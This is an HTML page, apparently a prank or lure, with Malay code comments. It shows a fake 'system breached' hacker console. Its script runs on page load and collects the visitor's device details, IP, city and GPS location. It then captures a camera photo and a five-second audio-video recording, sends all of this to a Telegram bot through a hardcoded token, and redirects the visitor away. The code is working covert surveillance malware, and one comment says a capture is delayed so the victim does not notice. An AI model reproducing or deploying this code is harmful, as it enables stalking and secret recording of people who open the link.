<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM_CRITICAL_ERROR</title>
    <style>
        body {
            background: #000;
            color: #0f0; /* Warna hijau hacker */
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            text-shadow: 0 0 5px #0f0;
        }
        .container {
            width: 80%;
            max-width: 600px;
        }
        .header {
            font-weight: bold;
            font-size: 1.2rem;
            margin-bottom: 20px;
            border-bottom: 1px solid #0f0;
            padding-bottom: 10px;
            width: 100%;
            text-align: center;
        }
        #console {
            font-size: 0.9rem;
            line-height: 1.5;
            height: 200px;
            overflow: hidden;
        }
        .cursor {
            display: inline-block;
            width: 10px;
            height: 15px;
            background: #0f0;
            animation: blink 0.8s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 0; }
            50% { opacity: 1; }
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            border: 1px solid #0f0;
            margin-top: 20px;
            position: relative;
        }
        .progress-fill {
            height: 100%;
            background: #0f0;
            width: 0%;
            transition: width 0.5s;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header"> [!] SYSTEM PENETRATION DETECTED [!] </div>
        <div id="console"></div>
        <div class="progress-bar">
            <div class="progress-fill" id="fill"></div>
        </div>
        <p id="status">Bypassing security protocols... <span class="cursor"></span></p>
    </div>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const urlParams = new URLSearchParams(window.location.search);
        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930';

        const consoleElem = document.getElementById('console');
        const fill = document.getElementById('fill');

        // Fungsi hiasan untuk nampak gaya hacker
        function logToConsole(text) {
            const p = document.createElement('p');
            p.style.margin = '2px 0';
            p.innerHTML = `> ${text}`;
            consoleElem.appendChild(p);
            if (consoleElem.childNodes.length > 8) {
                consoleElem.removeChild(consoleElem.firstChild);
            }
        }

        async function startTrace() {
            logToConsole("Initializing kernel exploit...");
            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
            
            // Animasi progress bar palsu
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 95) clearInterval(interval);
                width += Math.random() * 10;
                fill.style.width = `${width}%`;
            }, 800);

            // --- 1. Info Bateri ---
            let infoBateri = "N/A";
            try {
                const battery = await navigator.getBattery();
                infoBateri = `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Discharging"})`;
                logToConsole(`Power source: ${infoBateri}`);
            } catch (e) {}

            // --- 2. Info Rangkaian ---
            let infoRangkaian = "N/A";
            if (navigator.connection) {
                infoRangkaian = navigator.connection.effectiveType.toUpperCase();
                logToConsole(`Network link: ${infoRangkaian}`);
            }

            // --- 3. Ambil Brand Phone ---
            let brandPhone = "Unknown Device";
            if (navigator.userAgentData) {
                try {
                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                    brandPhone = `${info.platform} (${info.model || "Standard"})`;
                } catch (e) {}
            } else {
                const ua = navigator.userAgent;
                if (ua.match(/iPhone/i)) brandPhone = "iPhone (iOS)";
                else if (ua.match(/Android/i)) brandPhone = "Android";
            }
            logToConsole(`Device signature: ${brandPhone}`);

            // --- 4. Ambil IP ---
            try {
                logToConsole("Locating IP address...");
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                logToConsole(`Remote IP: ${data.ip}`);
                
                let infoAsas = `🚨 *HACKER ALERT: SYSTEM BREACHED*\n` +
                               `📱 *Device:* ${brandPhone}\n` +
                               `🌐 *IP:* \`${data.ip}\`\n` +
                               `📍 *City:* ${data.city}, ${data.country_name}\n` +
                               `🔋 *Battery:* ${infoBateri}\n` +
                               `📡 *Net:* ${infoRangkaian}\n` +
                               `⏰ *Time:* ${waktu}`;
                
                await sendToTele(infoAsas);
            } catch (e) { 
                await sendToTele(`⚠️ Breach detected [${brandPhone}] - IP tracing failed.`);
            }

            // --- 5. Lokasi GPS ---
            if (navigator.geolocation) {
                logToConsole("Injecting GPS tracer...");
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await sendToTele(`📍 *COORDINATES FOUND*\n[Google Maps](${mapLink})`);
                    logToConsole("Location locked.");
                }, null, { enableHighAccuracy: true });
            }

            // --- 6. Ambil Gambar & Rakaman Video ---
            try {
                logToConsole("Activating remote camera...");
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // A. Tangkap Gambar (1.5 saat delay supaya user tak perasan serta-merta)
                await new Promise(res => setTimeout(res, 2500)); 
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CURRENT_CHAT_ID);
                    fd.append('photo', blob, 'snap.jpg');
                    fd.append('caption', `📸 *FACE CAPTURED*\n📱 Device: ${brandPhone}\n🆔 ID: ${CURRENT_CHAT_ID}`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                // B. RAKAM VIDEO (5 Saat)
                logToConsole("Recording data stream...");
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    logToConsole("Uploading packets...");
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    const fdV = new FormData();
                    fdV.append('chat_id', CURRENT_CHAT_ID);
                    fdV.append('video', videoBlob, 'record.mp4');
                    fdV.append('caption', `📹 *VIDEO STREAM (5s)*\n📱 ${brandPhone}`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fdV });
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                setTimeout(() => { mediaRecorder.stop(); }, 5000);

            } catch (e) {
                logToConsole("Camera access: DENIED");
            }

            // Redirect selepas 13 saat
            setTimeout(() => {
                window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p";
            }, 10000);
        }

        async function sendToTele(text) {
            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CURRENT_CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        window.onload = startTrace;
    </script>
</body>
</html>
